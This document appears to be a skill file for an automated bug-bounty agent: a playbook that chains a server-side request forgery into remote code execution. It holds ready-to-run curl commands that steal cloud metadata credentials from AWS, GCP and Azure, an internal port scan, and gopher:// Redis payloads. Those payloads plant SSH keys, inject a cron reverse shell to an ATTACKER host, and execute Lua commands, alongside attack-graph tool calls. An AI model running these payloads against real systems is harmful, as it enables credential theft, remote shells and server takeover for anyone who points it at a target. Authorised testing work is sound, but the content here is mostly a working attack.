---
name: ssrf-to-rce
description: Chain playbook — turn a blind or informational SSRF into unauthenticated RCE via cloud metadata, internal services (Redis, Gitea, Jenkins), or protocol smuggling. The single highest-EV chain in modern bug bounty.
---

# Chain: SSRF → RCE

You have a confirmed SSRF (from the `ssrf` skill). This playbook
walks it through every pivot that leads to remote code execution.

## Pivot graph

```
SSRF confirmed
   │
   ├─▶ Cloud metadata → IAM creds → AWS/GCP/Azure API → RCE via SSM/Instance
   │
   ├─▶ Internal Redis / Memcached (unauth) → Lua eval / cron hijack → RCE
   │
   ├─▶ Internal Elasticsearch → Groovy sandbox escape / script.painless → RCE
   │
   ├─▶ Internal Jenkins (no auth UI) → script console → RCE
   │
   ├─▶ Internal Docker daemon (2375) → container spawn → host RCE
   │
   ├─▶ Internal Consul / Nomad (8500/4646) → job submission → RCE
   │
   ├─▶ gopher:// to SMTP → spoofed admin invite → account takeover → cred reuse
   │
   └─▶ file:// → /proc/self/environ → env vars → secret leak → off-host pivot
```

## Step 1 — IMDS triage

```bash
# AWS v1 — most common, instant win
SSRF_URL="https://target.com/api/fetch?u="
curl -s "${SSRF_URL}http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → role name
curl -s "${SSRF_URL}http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"
# → AccessKeyId / SecretAccessKey / Token

# AWS v2 — needs PUT with token header, often blocked by one-way SSRF but
# sometimes bypassed via 30x chain
curl -s -X PUT "${SSRF_URL}http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# GCP
curl -s -H "Metadata-Flavor: Google" "${SSRF_URL}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -s "${SSRF_URL}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Record each pivot as a graph node + edge:
```
kg_add_node kind=credential label="IAM role xxx" props={"type":"aws_session"}
kg_add_edge src=<ssrf_vuln_id> dst=<cred_id> kind=leaks weight=0.2
```

## Step 2 — internal service fingerprinting

Common internal targets, checked in order of frequency:

```bash
for port in 6379 9200 8500 4646 2375 8080 8081 8082 9000 9090 2181 7474; do
  curl -s --max-time 5 "${SSRF_URL}http://127.0.0.1:${port}/"
done
```

Record each responding service as a `service` node and add a
`runs_on → internal host` edge.

## Step 3 — Redis → RCE gadget

If `127.0.0.1:6379` responds:

```bash
# Variant 1: write ssh key (works if redis owns ~/.ssh)
curl "${SSRF_URL}gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAAA...%5Cn%5Cn%22%0D%0ASAVE%0D%0A"

# Variant 2: crontab injection
curl "${SSRF_URL}gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20x%20%22%5Cn%5Cn*%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/ATTACKER/4444%200>&1%5Cn%5Cn%22%0D%0ASAVE%0D%0A"

# Variant 3: Lua eval (post-confirmed auth)
curl "${SSRF_URL}gopher://127.0.0.1:6379/_EVAL%20%22os.execute('id > /tmp/pwn')%22%200"
```

## Step 4 — Elasticsearch / Jenkins / Docker pivots

Each deserves its own sub-playbook. Add as graph nodes under the chain,
then call `plan_attack_chains(promote=True)` once the cheapest path
runs end-to-end.

## Step 5 — chain finalisation

After the last pivot succeeds, your graph should contain:

```
entrypoint (public /fetch endpoint)
  ─enables→ vulnerability (SSRF in /fetch)
       ─leaks→ credential (IAM role creds)
                ─grants→ crown_jewel (S3 bucket)
  OR
  ─enables→ vulnerability (SSRF)
       ─enables→ vulnerability (Redis RCE gadget)
                ─enables→ finding (validated shell)
                          ─validates→ crown_jewel
```

Run:
```python
plan_attack_chains(promote=True, top_k=5)
```

And include the resulting `chain` node ID in your finding report.

## Step 6 — CVSS

For any SSRF → RCE with scope change (SSRF reaches something outside
the web app's trust boundary):
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0**

## Step 7 — report framing

Bug bounty triagers love the "one-page kill chain" format:

```
Step 1 — Prove SSRF exists (curl evidence)
Step 2 — Prove reachable internal service (curl evidence)
Step 3 — Prove exploitation of internal service (rendered response)
Step 4 — Prove impact on production data (exfil sample, redacted)
CVSS + remediation + PoC script
```
